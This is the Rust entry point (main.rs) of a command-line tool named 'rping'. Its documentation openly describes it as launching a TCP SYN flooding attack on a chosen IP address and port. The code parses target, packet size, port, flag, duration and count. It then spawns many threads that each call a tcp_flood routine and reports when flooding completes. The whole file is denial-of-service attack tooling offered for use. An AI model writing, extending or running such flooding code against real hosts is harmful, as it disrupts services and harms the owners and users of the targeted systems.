/// The main entry point of `rping`.
///
/// It parses command-line arguments using the `clap` crate, configures the SYN flooding parameters based on
/// the provided command-line options, and initiates a TCP SYN flooding attack on the specified target.
///
/// # Arguments
/// * `--target` - The target IP address for the SYN flooding attack.
/// * `--size` - The length of SYN packets to be sent.
/// * `--port` - The target port number for the SYN flooding attack.
///
/// # Examples
/// ```
/// // Run the `rping` CLI with a target IP address, packet length, and target port.
/// rping --target 192.168.1.1 --size 100 --port 80
/// ```
///
/// # Errors
/// The function handles errors gracefully and prints out error messages if the SYN flooding attack fails,
/// if the target is missing, etc.
fn main() -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(feature = "cli")]
    {
        use clap::Parser;
        use rping::cli::Cli;
        use rping::utils::tcp_flood;
        use std::thread;

        // Parse command-line arguments
        let args = Cli::parse();

        // Check for a minimum packet length of 44
        if args.size < 44 {
            return Err("Packet length should be at least 44 bytes(IP + TCP headers)!".into());
        }

        if !args.target.is_empty() {
            // Initialize thread handles
            let mut handles = vec![];

            for _ in 0..args.threads {
                let args_clone = args.clone();

                // Spawn threads
                let handle = thread::spawn(move || {
                    if let Err(err) = tcp_flood(
                        args_clone.size,
                        &args_clone.target,
                        args_clone.port.try_into().unwrap(),
                        &args_clone.flag.to_ascii_lowercase(),
                        args_clone.duration,
                        args_clone.number,
                    ) {
                        eprintln!("Thread failed: {:?}", err);
                    }
                });

                handles.push(handle);
            }

            // Collect errors during thread execution
            let mut errors = Vec::new();

            for handle in handles {
                if let Err(err) = handle.join() {
                    errors.push(err);
                }
            }

            // Handle errors after thread execution
            if !errors.is_empty() {
                eprintln!("Some threads failed to join:");
                for err in errors {
                    eprintln!("Error: {:?}", err);
                }
                eprintln!("Please file an issue on GitHub (https://github.com/wiseaidev/rping) with details about the error.");
                return Err("One or more threads failed to join".into());
            } else {
                println!("\nFlooding completed successfully!");
                return Ok(());
            }
        }
    }
    Ok(())
}
